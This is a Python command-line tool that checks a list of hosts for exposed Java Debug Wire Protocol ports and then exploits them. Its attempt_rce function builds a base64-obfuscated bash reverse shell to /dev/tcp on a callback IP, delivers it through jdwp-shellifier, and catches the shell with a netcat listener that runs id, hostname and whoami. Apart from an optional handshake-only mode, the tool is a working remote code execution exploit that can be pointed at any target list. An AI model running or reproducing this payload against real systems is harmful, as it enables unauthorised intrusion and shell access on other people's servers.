#!/usr/bin/env python3
"""
jdwp_check.py — JDWP Remote Code Execution Checker

Tests exposed Java Debug Wire Protocol (JDWP) endpoints for:
  1. Port reachability
  2. JDWP handshake confirmation
  3. Remote code execution via reverse shell (jdwp-shellifier)

JDWP is unauthenticated by design. Any externally reachable JDWP port
allows arbitrary code execution as the Java process user.
A confirmed handshake alone is a critical finding.

Usage:
  python3 jdwp_check.py -t targets.txt
  python3 jdwp_check.py -t targets.txt --callback-ip 10.0.0.5 --callback-port 4444
  python3 jdwp_check.py -t targets.txt --handshake-only

Target file format (one per line):
  IP:PORT
  IP:PORT|HOSTNAME
  IP:PORT|HOSTNAME|JAVA_VERSION

Lines starting with # are ignored. Empty lines are skipped.

Requirements:
  - Python 3.8+
  - jdwp-shellifier (https://github.com/IOActive/jdwp-shellifier) for RCE checks
  - python2 in PATH (jdwp-shellifier dependency)
  - netcat (nc) for handshake checks

Author: ChiZu (https://github.com/G0ldSec)
License: MIT
"""

import argparse
import datetime
import os
import re
import signal
import socket
import subprocess
import sys
import textwrap
import time
from base64 import b64encode
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional


# ── ANSI colors ──────────────────────────────────────────────────
class C:
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    YELLOW = "\033[0;33m"
    BOLD = "\033[1m"
    NC = "\033[0m"

    @classmethod
    def disable(cls):
        cls.RED = cls.GREEN = cls.YELLOW = cls.BOLD = cls.NC = ""


# ── Data classes ─────────────────────────────────────────────────
@dataclass
class Target:
    ip: str
    port: int
    hostname: str = "N/A"
    java_version: str = "unknown"


@dataclass
class Result:
    target: Target
    port_open: bool = False
    handshake_ok: bool = False
    rce_confirmed: bool = False
    rce_proof: str = ""
    details: str = ""


@dataclass
class Stats:
    total: int = 0
    port_open: int = 0
    port_closed: int = 0
    handshake_ok: int = 0
    rce_ok: int = 0
    rce_fail: int = 0
    rce_hosts: list = field(default_factory=list)
    handshake_hosts: list = field(default_factory=list)


# ── Target parsing ───────────────────────────────────────────────
def parse_targets(filepath: str) -> list[Target]:
    """Parse target file. Format: IP:PORT[|HOSTNAME[|JAVA_VERSION]]"""
    targets = []
    path = Path(filepath)
    if not path.exists():
        print(f"{C.RED}[!] Target file not found: {filepath}{C.NC}")
        sys.exit(1)

    for lineno, raw_line in enumerate(path.read_text().splitlines(), 1):
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue

        parts = line.split("|")
        ipport = parts[0].strip()

        if ":" not in ipport:
            print(f"{C.YELLOW}[!] Skipping line {lineno} (no port): {line}{C.NC}")
            continue

        ip, port_str = ipport.rsplit(":", 1)
        try:
            port = int(port_str)
        except ValueError:
            print(f"{C.YELLOW}[!] Skipping line {lineno} (invalid port): {line}{C.NC}")
            continue

        hostname = parts[1].strip() if len(parts) > 1 else "N/A"
        java_ver = parts[2].strip() if len(parts) > 2 else "unknown"
        targets.append(Target(ip=ip, port=port, hostname=hostname, java_version=java_ver))

    if not targets:
        print(f"{C.RED}[!] No valid targets found in {filepath}{C.NC}")
        sys.exit(1)

    return targets


# ── Network helpers ──────────────────────────────────────────────
def check_port(ip: str, port: int, timeout: int = 5) -> bool:
    """TCP connect check."""
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def check_jdwp_handshake(ip: str, port: int, timeout: int = 5) -> bool:
    """Send JDWP-Handshake and check for echo response."""
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            s.sendall(b"JDWP-Handshake")
            response = s.recv(64)
            return b"JDWP-Handshake" in response
    except (socket.timeout, ConnectionRefusedError, OSError, BrokenPipeError):
        return False


def detect_callback_ip(target_ip: str) -> Optional[str]:
    """Auto-detect the local IP used to route to the target network."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((target_ip, 1))
            return s.getsockname()[0]
    except OSError:
        return None


# ── RCE check via jdwp-shellifier ────────────────────────────────
def attempt_rce(
    target: Target,
    callback_ip: str,
    callback_port: int,
    shellifier_path: str,
    python2_bin: str = "python2",
    shellifier_timeout: int = 15,
    shell_wait: int = 5,
    logger=None,
) -> tuple[bool, str, str]:
    """
    Attempt RCE via jdwp-shellifier with a reverse shell payload.

    Returns: (success: bool, proof_type: str, details: str)
    """
    log = logger or (lambda msg: None)

    # Build reverse shell payload with base64 Runtime.exec() bypass
    revshell = f"bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1"
    revshell_b64 = b64encode(revshell.encode()).decode()
    rce_cmd = f"bash -c {{echo,{revshell_b64}}}|{{base64,-d}}|bash"

    log(f"        Payload: {rce_cmd}")

    # Start netcat listener in background
    callback_log = f"/tmp/jdwp_shell_{target.ip}_{target.port}.log"
    try:
        os.remove(callback_log)
    except FileNotFoundError:
        pass

    listener_cmd = (
        f'echo "id && hostname && whoami && echo JDWP_RCE_CONFIRMED && exit" | '
        f"nc -nlvp {callback_port} 2>&1"
    )
    listener_timeout = shellifier_timeout + shell_wait + 5

    with open(callback_log, "w") as logf:
        listener_proc = subprocess.Popen(
            ["bash", "-c", f"timeout {listener_timeout} bash -c '{listener_cmd}'"],
            stdout=logf,
            stderr=subprocess.STDOUT,
        )

    time.sleep(1)

    # Run jdwp-shellifier
    shellifier_cmd = [
        python2_bin,
        shellifier_path,
        "-t", target.ip,
        "-p", str(target.port),
        "--break-on", "java.lang.String.valueOf",
        "--cmd", rce_cmd,
    ]

    try:
        proc = subprocess.run(
            shellifier_cmd,
            capture_output=True,
            text=True,
            timeout=shellifier_timeout,
        )
        output = proc.stdout + proc.stderr
        for line in output.splitlines():
            if re.search(r"attached|break|executing|runtime|sleep|thread", line, re.I):
                log(f"        {line.strip()}")
    except subprocess.TimeoutExpired:
        log(f"        {C.YELLOW}jdwp-shellifier: Timeout ({shellifier_timeout}s){C.NC}")
    except FileNotFoundError:
        log(f"        {C.RED}jdwp-shellifier or python2 not found{C.NC}")
        _cleanup_listener(listener_proc, callback_log)
        return False, "", "shellifier not found"

    # Wait for possible callback
    log(f"        Waiting {shell_wait}s for reverse shell...")
    time.sleep(shell_wait)

    # Stop listener and read results
    _cleanup_listener(listener_proc, callback_log=None)  # don't delete yet

    callback_data = ""
    try:
        callback_data = Path(callback_log).read_text()
    except FileNotFoundError:
        pass

    try:
        os.remove(callback_log)
    except FileNotFoundError:
        pass

    # Evaluate callback
    if "JDWP_RCE_CONFIRMED" in callback_data:
        return True, "SHELL", callback_data

    if "uid=" in callback_data:
        return True, "ID", callback_data

    # Check for connection from target IP
    match = re.search(r"from \(UNKNOWN\) \[([^\]]+)\]", callback_data)
    if match and match.group(1) == target.ip:
        return True, "CALLBACK", callback_data

    # Check generic connect
    if re.search(r"connect to.*from", callback_data, re.I):
        return False, "", "callback from unexpected IP"

    return False, "", "no callback received"


def _cleanup_listener(proc: subprocess.Popen, callback_log: Optional[str] = None):
    """Terminate listener process and optionally remove log."""
    try:
        proc.terminate()
        proc.wait(timeout=3)
    except (ProcessLookupError, subprocess.TimeoutExpired):
        try:
            proc.kill()
        except ProcessLookupError:
            pass
    if callback_log:
        try:
            os.remove(callback_log)
        except FileNotFoundError:
            pass


# ── Logging ──────────────────────────────────────────────────────
class Logger:
    def __init__(self, logfile: str):
        self.logfile = logfile
        self._fh = open(logfile, "w")

    def log(self, msg: str = ""):
        print(msg)
        # Strip ANSI for file output
        clean = re.sub(r"\033\[[0-9;]*m", "", msg)
        self._fh.write(clean + "\n")
        self._fh.flush()

    def close(self):
        self._fh.close()


# ── Main scan logic ──────────────────────────────────────────────
def run_scan(args: argparse.Namespace):
    targets = parse_targets(args.targets)
    stats = Stats(total=len(targets))

    # Resolve callback IP
    callback_ip = args.callback_ip
    if not callback_ip and not args.handshake_only:
        callback_ip = detect_callback_ip(targets[0].ip)
        if not callback_ip:
            print(f"{C.RED}[!] Could not auto-detect callback IP.{C.NC}")
            print(f"    Use --callback-ip YOUR_IP or --handshake-only")
            sys.exit(1)

    # Resolve shellifier path
    shellifier_path = args.shellifier
    if not args.handshake_only and not Path(shellifier_path).exists():
        print(f"{C.RED}[!] jdwp-shellifier not found: {shellifier_path}{C.NC}")
        print(f"    Install: git clone https://github.com/IOActive/jdwp-shellifier")
        print(f"    Or use --handshake-only to skip RCE checks")
        sys.exit(1)

    logfile = f"jdwp_results_{datetime.datetime.now():%Y%m%d_%H%M%S}.txt"
    logger = Logger(logfile)
    log = logger.log

    # Header
    log("")
    log(f"{C.BOLD}     ╦╔╦╗╦ ╦╔═╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗{C.NC}")
    log(f"{C.BOLD}     ║ ║║║║║╠═╝  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝{C.NC}")
    log(f"{C.BOLD}    ╚╝═╩╝╚╩╝╩    ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═{C.NC}")
    log(f"                              {C.RED}by ChiZu{C.NC}")
    log(f"     github.com/G0ldSec")
    log(f"{'─' * 50}")
    log(f"  Date       : {datetime.datetime.now():%Y-%m-%d %H:%M:%S}")
    log(f"  Targets    : {stats.total} JDWP endpoints")
    if not args.handshake_only:
        log(f"  Callback   : {callback_ip}:{args.callback_port}")
        log(f"  Shellifier : {shellifier_path}")
        log(f"  Timeout    : {args.timeout}s per target")
    else:
        log(f"  Mode       : Handshake-only (no RCE attempts)")
    log(f"{'=' * 70}")
    log("")

    # Main loop
    for i, target in enumerate(targets, 1):
        log(f"{'─' * 70}")
        log(f"{C.BOLD}[{i}/{stats.total}] {target.ip}:{target.port}{C.NC}  "
            f"({target.hostname}, Java {target.java_version})")
        log(f"{'─' * 70}")

        # Step 1: Port check
        step_count = "2" if args.handshake_only else "3"
        log(f"  [1/{step_count}] Port check...")
        if not check_port(target.ip, target.port, timeout=args.connect_timeout):
            log(f"  {C.RED}✗ Port closed{C.NC}")
            stats.port_closed += 1
            log("")
            continue

        log(f"  {C.GREEN}✓ Port open{C.NC}")
        stats.port_open += 1

        # Step 2: JDWP handshake
        log(f"  [2/{step_count}] JDWP handshake...")
        if check_jdwp_handshake(target.ip, target.port, timeout=args.connect_timeout):
            log(f"  {C.GREEN}✓ JDWP handshake confirmed{C.NC}")
            stats.handshake_ok += 1
            stats.handshake_hosts.append(target)
        else:
            log(f"  {C.YELLOW}⚠ No handshake (busy/not JDWP){C.NC}")

        if args.handshake_only:
            log("")
            if i < stats.total:
                time.sleep(args.pause)
            continue

        time.sleep(args.pause)

        # Step 3: RCE via reverse shell
        log(f"  [3/3] Reverse shell attempt...")
        success, proof, details = attempt_rce(
            target=target,
            callback_ip=callback_ip,
            callback_port=args.callback_port,
            shellifier_path=shellifier_path,
            python2_bin=args.python2,
            shellifier_timeout=args.timeout,
            shell_wait=args.shell_wait,
            logger=log,
        )

        if success:
            log("")
            log(f"  {C.RED}{C.BOLD}{'=' * 46}{C.NC}")
            log(f"  {C.RED}{C.BOLD}  RCE CONFIRMED — Proof: {proof}{C.NC}")
            log(f"  {C.RED}{C.BOLD}{'=' * 46}{C.NC}")
            if details:
                for line in details.splitlines():
                    line = line.strip()
                    if line and not re.match(r"^(nc:|listening)", line, re.I):
                        log(f"        {C.RED}{line}{C.NC}")
            stats.rce_ok += 1
            stats.rce_hosts.append((target, proof))
        else:
            if details:
                log(f"  {C.YELLOW}⚠ {details}{C.NC}")
            else:
                log(f"  {C.YELLOW}⚠ No callback / no shell received{C.NC}")
            stats.rce_fail += 1

        log("")
        if i < stats.total:
            time.sleep(args.pause)

    # Summary
    log("")
    log(f"{C.BOLD}{'=' * 70}{C.NC}")
    log(f"{C.BOLD}  SUMMARY{C.NC}")
    log(f"{C.BOLD}{'=' * 70}{C.NC}")
    log(f"  Tested               : {stats.total}")
    log(f"  Port open            : {stats.port_open}")
    log(f"  Handshake confirmed  : {stats.handshake_ok}")
    if not args.handshake_only:
        log(f"  RCE confirmed        : {stats.rce_ok}")
        log(f"  No RCE proof         : {stats.rce_fail}")
    log(f"  Port closed          : {stats.port_closed}")
    log(f"{'=' * 70}")

    if stats.rce_hosts:
        log("")
        log(f"{C.RED}{C.BOLD}Hosts with confirmed RCE:{C.NC}")
        log(f"{'─' * 70}")
        log(f"  {'IP':<18} {'Port':<8} {'Hostname':<30} {'Java':<10} {'Proof'}")
        log(f"  {'─'*17} {'─'*7} {'─'*29} {'─'*9} {'─'*6}")
        for target, proof in stats.rce_hosts:
            log(f"  {target.ip:<18} {target.port:<8} {target.hostname:<30} "
                f"{target.java_version:<10} {proof}")

    if stats.handshake_hosts:
        log("")
        log(f"{C.YELLOW}{C.BOLD}All hosts with JDWP handshake (externally exposed):{C.NC}")
        log(f"{'─' * 70}")
        log(f"  {'IP':<18} {'Port':<8} {'Hostname':<35} {'Java'}")
        log(f"  {'─'*17} {'─'*7} {'─'*34} {'─'*9}")
        for t in stats.handshake_hosts:
            log(f"  {t.ip:<18} {t.port:<8} {t.hostname:<35} {t.java_version}")

    log("")
    log(f"{C.BOLD}Note:{C.NC} JDWP is unauthenticated by design. Any externally reachable")
    log(f"JDWP port allows arbitrary code execution as the Java process user.")
    log(f"A confirmed handshake is a critical finding, even without shell proof.")
    log("")
    log(f"Log: {os.path.abspath(logfile)}")

    logger.close()

    # Exit code: 2 = RCE found, 1 = handshake found, 0 = clean
    if stats.rce_ok > 0:
        sys.exit(2)
    elif stats.handshake_ok > 0:
        sys.exit(1)
    sys.exit(0)


# ── CLI ──────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="JDWP Remote Code Execution Checker",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Target file format (one per line):
              IP:PORT
              IP:PORT|HOSTNAME
              IP:PORT|HOSTNAME|JAVA_VERSION

            Examples:
              %(prog)s -t targets.txt
              %(prog)s -t targets.txt --callback-ip 10.0.0.5 --callback-port 4444
              %(prog)s -t targets.txt --handshake-only
              %(prog)s -t targets.txt --shellifier /opt/jdwp-shellifier/jdwp-shellifier.py

            Exit codes:
              0 = No JDWP exposure found
              1 = JDWP handshake confirmed (critical)
              2 = Remote code execution confirmed (critical)
        """),
    )

    parser.add_argument(
        "-t", "--targets", required=True,
        help="Path to target file (one IP:PORT per line)",
    )
    parser.add_argument(
        "--callback-ip", default=None,
        help="Your IP for reverse shell callbacks (auto-detected if omitted)",
    )
    parser.add_argument(
        "--callback-port", type=int, default=44444,
        help="Port for reverse shell listener (default: 44444)",
    )
    parser.add_argument(
        "--shellifier", default=os.path.expanduser("~/jdwp-shellifier/jdwp-shellifier.py"),
        help="Path to jdwp-shellifier.py (default: ~/jdwp-shellifier/jdwp-shellifier.py)",
    )
    parser.add_argument(
        "--python2", default="python2",
        help="Python 2 binary for jdwp-shellifier (default: python2)",
    )
    parser.add_argument(
        "--timeout", type=int, default=15,
        help="Shellifier timeout in seconds (default: 15)",
    )
    parser.add_argument(
        "--connect-timeout", type=int, default=5,
        help="TCP connect timeout in seconds (default: 5)",
    )
    parser.add_argument(
        "--shell-wait", type=int, default=5,
        help="Seconds to wait for reverse shell connect (default: 5)",
    )
    parser.add_argument(
        "--pause", type=int, default=5,
        help="Pause between targets in seconds (default: 5)",
    )
    parser.add_argument(
        "--handshake-only", action="store_true",
        help="Only check for JDWP handshake, skip RCE attempts",
    )
    parser.add_argument(
        "--no-color", action="store_true",
        help="Disable colored output",
    )

    args = parser.parse_args()

    if args.no_color:
        C.disable()

    run_scan(args)


if __name__ == "__main__":
    main()
